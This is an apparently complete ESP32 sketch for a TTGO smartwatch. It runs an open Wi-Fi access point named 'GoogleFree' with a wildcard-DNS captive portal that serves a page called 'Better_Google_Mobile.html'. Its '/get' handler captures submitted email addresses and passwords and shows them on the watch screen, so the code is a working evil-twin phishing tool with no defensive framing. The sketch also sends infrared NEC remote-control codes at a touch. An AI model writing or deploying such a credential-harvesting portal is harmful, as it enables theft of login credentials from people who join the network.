#include "ESPAsyncWebServer.h"
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <WiFi.h>
#include <LittleFS.h> //filesystem
#include "config.h"
#include <IRremote.h>

#define MAX_HTML_SIZE 20000
#define DNS_PORT 53
#define BUTTON_PIN 0

// GLOBALS
DNSServer dnsServer;
AsyncWebServer server(80);
bool serverActive = false;
IRsend irsend(13);  // IR LED connected to pin 25


const int toggle_X = 170;
const int toggle_Y = 180;
const int toggle_WIDTH = 240;
const int toggle_HEIGHT = 60;

const int blaster_X = 100;
const int blaster_Y = 180;
const int blaster_WIDTH = 70;
const int blaster_HEIGHT = 60;

TTGOClass *ttgo; 
AXP20X_Class *power;  

char apName[30] = "ESP32-Network";  // AP name

void sendIRCodes() {
  ttgo->tft->fillRect(blaster_X, blaster_Y, blaster_WIDTH, blaster_HEIGHT, TFT_YELLOW);

  // This stuff, ignore it.

  irsend.sendNEC(encodeNEC16(0x8355, 0x906F), 32);
  delay(100);
  irsend.sendNEC(encodeNEC16(0x8103, 0xF00F), 32);
  delay(100);
  
  //irsend.sendNEC(encodeNEC(0x83550000,0x906F0000),8);
  delay(100);


  Serial.println("All data sent");
  ttgo->tft->fillRect(blaster_X, blaster_Y, blaster_WIDTH, blaster_HEIGHT, TFT_PURPLE);
}

uint32_t encodeNEC16(uint16_t address, uint16_t command) { 
    uint16_t addressLower = reverseBits16(address, 16);  // Reverse 16 bits of address
    command = reverseBits16(command, 16);               // Reverse 16 bits of command

    return ((uint64_t)addressLower << 16) | command;
}


uint32_t reverseBits16(uint32_t num, int bitCount) {
    uint16_t reversed = 0;
    for (int i = 0; i < bitCount; i++) {
        reversed = (reversed << 1) | (num & 1);
        num >>= 1;
    }
    return reversed;
}



void clearScreen() {
  ttgo->tft->fillScreen(TFT_BLACK);
}

void showToggle() {
  // clear area
  ttgo->tft->fillRect(toggle_X, toggle_Y, toggle_WIDTH, toggle_HEIGHT, TFT_BLACK);

  // toggle background
  uint16_t bgColor = serverActive ? TFT_GREEN : TFT_RED;
  ttgo->tft->fillRect(toggle_X, toggle_Y, toggle_WIDTH, toggle_HEIGHT, bgColor);

  // toggle status text
  ttgo->tft->setTextColor(TFT_WHITE);
  ttgo->tft->setTextSize(2);
  ttgo->tft->setCursor(toggle_X + 15, toggle_Y + 20);
  ttgo->tft->print(serverActive ? "ON" : "OFF");

  ttgo->tft->fillRect(blaster_X, blaster_Y, blaster_WIDTH, blaster_HEIGHT, TFT_PURPLE);
}

void setupServer() {
  server.onNotFound([](AsyncWebServerRequest *request) {
    request->redirect("/");  
  });


  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    if (LittleFS.exists("/Better_Google_Mobile.html")) {
      AsyncWebServerResponse *response = request->beginResponse(LittleFS, "/Better_Google_Mobile.html", "text/html");
      request->send(response);
    } else {
      request->send(404, "text/plain", "File not found");
    }
  });


  server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request) {
    String user_name;
    String password;
    if (request->hasParam("email")) {
      user_name = request->getParam("email")->value();
    }
    if (request->hasParam("password")) {
      password = request->getParam("password")->value();
    }
    ttgo->tft->fillRect(0, 100, 170, 50, TFT_BLACK);
    ttgo->tft->setCursor(0, 100);
    ttgo->tft->println("Email: " + user_name);
    ttgo->tft->println("Password: " + password);


    request->send(200, "text/html", "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });

  server.begin();
  serverActive = true;
}

void startAP() {
  WiFi.mode(WIFI_AP);


  IPAddress local_ip(192, 168, 1, 1);
  //IPAddress default_gateway(192, 168, 1, 1);
  IPAddress subnet(255, 255, 255, 0);
  WiFi.softAPConfig(local_ip, local_ip, subnet); 

  WiFi.softAP(apName);

  IPAddress apIP = WiFi.softAPIP();

  clearScreen();  
  ttgo->tft->setTextColor(TFT_WHITE);
  ttgo->tft->setCursor(0, 0);
  ttgo->tft->setTextSize(2);
  ttgo->tft->println("AP started at: ");
  ttgo->tft->println(apIP);

  
  dnsServer.start(DNS_PORT, "*", apIP);

  
  setupServer();

  ttgo->tft->setCursor(0, 40);
  ttgo->tft->print("DNS and Server Ready");

  ttgo->tft->setCursor(0, 80);
  ttgo->tft->setTextColor(TFT_GREEN);
  ttgo->tft->print("Server started");
}

void stopServer() {
  dnsServer.stop();
  server.end();
  WiFi.softAPdisconnect(true);
  serverActive = false;

  clearScreen();
}

void toggleServer() {
  if (serverActive) {
    stopServer();
  } else {
    startAP();
  }
  showToggle();  
}

void detectTouch() {
  int16_t x, y;
  delay(150);  

  if (ttgo->getTouch(x, y)) {
    if (x >= toggle_X && x <= (toggle_X + toggle_WIDTH) && y >= toggle_Y && y <= (toggle_Y + toggle_HEIGHT)) {
      toggleServer();
    }
    if (x >= blaster_X && x <= (blaster_X + blaster_WIDTH) && y >= blaster_Y && y <= (blaster_Y + blaster_HEIGHT)) {
      sendIRCodes();
    }
  }
}

void setup() {
  ttgo = TTGOClass::getWatch();  
  ttgo->begin();
  ttgo->openBL();  

  clearScreen();
  ttgo->tft->setTextColor(TFT_WHITE);
  ttgo->tft->setCursor(0, 0);
  ttgo->tft->print("Initializing...");
  delay(1000);

  Serial.begin(115200);

  if (!LittleFS.begin(true)) {
    ttgo->tft->setTextSize(2);

    clearScreen();
    ttgo->tft->setCursor(0, 0);
    ttgo->tft->print("LittleFS Mount Failed");
    return;
  }

  clearScreen();
  ttgo->tft->setCursor(0, 0);
  ttgo->tft->setTextSize(2);
  ttgo->tft->print("LittleFS Mounted");

  strcpy(apName, "GoogleFree");
  showToggle();

  pinMode(BUTTON_PIN, INPUT_PULLUP);  
  irsend.enableIROut(38);
}

void loop() {
  if (serverActive) {
    dnsServer.processNextRequest();  
  }
  detectTouch();
}
